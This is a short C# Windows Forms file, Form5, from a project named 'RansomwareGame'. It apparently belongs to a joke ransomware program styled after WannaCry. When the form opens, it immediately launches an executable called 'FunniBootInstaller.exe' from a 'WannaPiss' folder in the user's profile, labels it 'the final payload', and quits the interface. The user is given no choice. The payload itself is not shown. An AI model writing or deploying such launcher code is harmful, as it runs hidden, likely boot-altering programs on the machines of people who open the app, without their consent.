using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RansomwareGame
{
    public partial class Form5 : Form
    {
        public Form5()
        {
            InitializeComponent();

            // Run the final payload
            kill();
        }

        void kill() {
            // Get file location
            string userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string payloadPath = userDirectory + "\\WannaPiss\\FunniBootInstaller.exe";

            // Start payload
            System.Diagnostics.Process.Start(payloadPath);

            // Quit GUI
            Environment.Exit(0);
        }
    }
}
